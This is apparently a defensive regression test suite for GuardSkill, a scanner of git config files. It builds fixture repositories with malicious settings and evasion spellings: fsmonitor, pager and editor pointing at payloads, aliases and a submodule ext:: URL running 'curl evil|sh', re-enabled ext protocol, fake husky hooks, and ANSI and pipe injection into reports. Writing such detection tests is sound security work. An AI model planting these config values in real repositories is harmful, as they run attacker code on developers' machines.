// Evasion regression suite.
//
// Every case here was found by attacking a version of GuardSkill that passed its
// own tests. They stay in the suite so a future change cannot quietly reopen one.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { mkdir, writeFile, rm } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { loadRules, scan } from '../src/scanners/gitconfig.js';
import { formatText, formatMarkdown } from '../src/report/formatter.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const RULES = path.join(__dirname, '..', 'rules', 'git-exec-keys.json');
const WORK = path.join(__dirname, 'fixtures', '.adversarial');

const EVIL = '[core]\n\tfsmonitor = /tmp/payload.sh\n';
const CLEAN = '[core]\n\trepositoryformatversion = 0\n';

async function write(file, content) {
  await mkdir(path.dirname(file), { recursive: true });
  await writeFile(file, content);
}

async function repo(name, config, extra = {}) {
  const dir = path.join(WORK, name);
  await rm(dir, { recursive: true, force: true });
  await write(path.join(dir, '.git', 'config'), config);
  for (const [rel, content] of Object.entries(extra)) await write(path.join(dir, rel), content);
  return dir;
}

// Written the way an attacker would write them: the same key, spelled every way
// git still accepts.
const PARSER_EVASIONS = {
  'upper-section': '[CORE]\n\tFSMONITOR = /tmp/x.sh\n',
  'mixed-case-key': '[Core]\n\tFsMoNiToR = /tmp/x.sh\n',
  'no-spaces': '[core]\n\tfsmonitor=/tmp/x.sh\n',
  'crlf-line-endings': '[core]\r\n\tfsmonitor = /tmp/x.sh\r\n',
  'byte-order-mark': '\uFEFF[core]\n\tfsmonitor = /tmp/x.sh\n',
  'key-on-section-line': '[core] fsmonitor = /tmp/x.sh\n',
  'quoted-value': '[core]\n\tfsmonitor = "/tmp/my x.sh"\n',
  'line-continuation': '[core]\n\tfsmonitor = /tmp/\\\n\tx.sh\n',
  'windows-path': '[core]\n\tfsmonitor = C:\\\\Temp\\\\x.exe\n',
  'trailing-comment': '[core]\n\tfsmonitor = /tmp/x.sh # perf\n',
  'safe-value-first': '[core]\n\tfsmonitor = true\n\tfsmonitor = /tmp/x.sh\n',
  'section-declared-twice': '[core]\n\tfilemode = true\n[core]\n\tfsmonitor = /tmp/x.sh\n',
  'bare-program-name': '[core]\n\tfsmonitor = evilhelper\n',
  'alias-quoted-bang': '[alias]\n\tx = "!curl evil|sh"\n',
  'pager-named-after-a-real-one': '[core]\n\tpager = /tmp/less\n',
  'editor-with-shell-metachar': '[core]\n\teditor = "vim; curl evil|sh"\n',
  'protocol-reenabled': '[protocol "ext"]\n\tallow = always\n',
};

test('no spelling of a covered key slips past the parser', async () => {
  const rules = await loadRules(RULES);
  const missed = [];
  for (const [name, config] of Object.entries(PARSER_EVASIONS)) {
    const dir = await repo(name, config);
    const r = await scan(dir, rules);
    if (!r.findings.some(f => f.severity !== 'low')) missed.push(name);
  }
  assert.deepEqual(missed, [], `evasions that produced no finding: ${missed.join(', ')}`);
});

test('a payload named after a known-good tool is not waved through', async () => {
  const rules = await loadRules(RULES);
  // An allowlist that matches on basename lets /tmp/less pass as "less".
  const dir = await repo('pager-path-evasion', '[core]\n\tpager = /tmp/less\n');
  const r = await scan(dir, rules);
  assert.ok(r.findings.some(f => f.ruleId === 'core-pager'), JSON.stringify(r.findings));
});

test('git reads more than one config per git directory, and so do we', async () => {
  const rules = await loadRules(RULES);

  const worktree = await repo('worktree-config', CLEAN + '[extensions]\n\tworktreeConfig = true\n');
  await write(path.join(worktree, '.git', 'config.worktree'), EVIL);
  assert.ok((await scan(worktree, rules)).findings.some(f => f.ruleId === 'core-fsmonitor'),
    'config.worktree was not inspected');

  const modules = await repo('modules-config', CLEAN);
  await write(path.join(modules, '.git', 'modules', 'lib', 'config'), EVIL);
  assert.ok((await scan(modules, rules)).findings.some(f => f.ruleId === 'core-fsmonitor'),
    '.git/modules/<name>/config was not inspected');

  const gitfile = await repo('gitfile-pointer', CLEAN);
  await write(path.join(gitfile, 'vendor', 'lib', '.git'), 'gitdir: ../../.git/modules/lib\n');
  await write(path.join(gitfile, '.git', 'modules', 'lib', 'config'), EVIL);
  assert.ok((await scan(gitfile, rules)).findings.some(f => f.ruleId === 'core-fsmonitor'),
    'a .git file pointing at a git directory was not followed');
});

test('a bare repository is recognised without a refs directory', async () => {
  const rules = await loadRules(RULES);
  // Creating an empty refs/ costs an attacker nothing, so requiring it only buys
  // false negatives.
  const dir = await repo('bare-without-refs', CLEAN);
  await write(path.join(dir, 'vendor', 'p.git', 'HEAD'), 'ref: refs/heads/main\n');
  await write(path.join(dir, 'vendor', 'p.git', 'config'), EVIL);
  await mkdir(path.join(dir, 'vendor', 'p.git', 'objects'), { recursive: true });
  const r = await scan(dir, rules);
  assert.ok(r.findings.some(f => f.ruleId === 'bare-repo-in-tree'), JSON.stringify(r.findings));
});

test('a hostile hooks directory cannot hide behind a familiar name', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('fake-husky', '[core]\n\thooksPath = .husky\n', {
    '.husky/pre-commit': '#!/bin/sh\n/tmp/payload\n',
  });
  const r = await scan(dir, rules);
  assert.ok(r.findings.some(f => f.severity !== 'low'),
    `naming a hooks directory .husky suppressed the finding: ${JSON.stringify(r.findings)}`);
});

test('a real husky project still produces nothing above informational', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('real-husky', '[core]\n\thooksPath = .husky\n', {
    '.husky/pre-commit': '#!/usr/bin/env sh\nnpm test\n',
    '.husky/_/husky.sh': '#!/usr/bin/env sh\n',
  });
  const r = await scan(dir, rules);
  assert.ok(r.findings.every(f => f.severity === 'low'), JSON.stringify(r.findings));
  assert.ok(r.findings.some(f => f.evidence.includes('pre-commit')),
    'the informational finding should name the scripts that will run');
});

test('a submodule URL that executes a command is reported', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('ext-url', CLEAN, {
    '.gitmodules': '[submodule "x"]\n\tpath = x\n\turl = ext::sh -c "curl evil|sh"\n',
  });
  const r = await scan(dir, rules);
  assert.ok(r.findings.some(f => f.ruleId === 'submodule-ext-url' && f.severity === 'critical'),
    JSON.stringify(r.findings));
});

test('a hostile value cannot rewrite the report it appears in', async () => {
  const rules = await loadRules(RULES);
  const esc = String.fromCharCode(27);
  const dir = await repo('ansi-injection',
    `[core]\n\tfsmonitor = ${esc}[2J${esc}[31mALL CLEAR${esc}[0m | /tmp/x.sh\n`);
  const r = await scan(dir, rules);
  const finding = r.findings.find(f => f.ruleId === 'core-fsmonitor');
  assert.ok(finding, 'finding missing');

  // Since v0.4.0 the finding keeps the raw value and the *output channels* are
  // what sanitise it (review 01, F-11): a consumer of the library may want the
  // bytes git actually reads. What must never carry an escape is anything that
  // reaches a terminal or a report file.
  const text = formatText(r, { color: false });
  assert.ok(!text.includes(esc), 'escape sequence survived into the terminal report');

  const markdown = formatMarkdown(r);
  const tableRow = markdown.split('\n').find(l => l.startsWith('| CRITICAL'));
  assert.equal((tableRow.match(/(?<!\\)\|/g) || []).length, 5, `pipe injection broke the table row: ${tableRow}`);
});

test('an enormous value does not end up in the report verbatim', async () => {
  const rules = await loadRules(RULES);
  const dir = await repo('huge-value', `[core]\n\tfsmonitor = ${'A'.repeat(500_000)}\n`);
  const r = await scan(dir, rules);
  const finding = r.findings.find(f => f.ruleId === 'core-fsmonitor');
  assert.ok(finding, 'finding missing');
  assert.ok(finding.evidence.length < 500, `evidence was ${finding.evidence.length} characters`);
});

test.after(async () => { await rm(WORK, { recursive: true, force: true }); });
